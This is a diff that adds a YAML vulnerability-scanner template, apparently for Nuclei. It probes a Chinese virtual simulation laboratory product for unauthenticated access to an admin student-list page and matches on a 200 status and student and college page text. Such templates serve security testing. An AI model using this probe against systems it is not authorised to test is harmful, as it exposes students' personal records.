@@ -1,0 +1,23 @@
+id: poc-yaml-a-er-fa-keji-xuni-fangzhen-laboratory-unauthorized-access
+
+info:
+  name: 阿尔法科技 虚拟仿真实验室 未授权访问漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: unauthorized-access,php
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/admin/student/studentlist.html?page=1"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "学生列表"
+          - "学院"
+          - ">请选择学院</option>"
+        condition: and
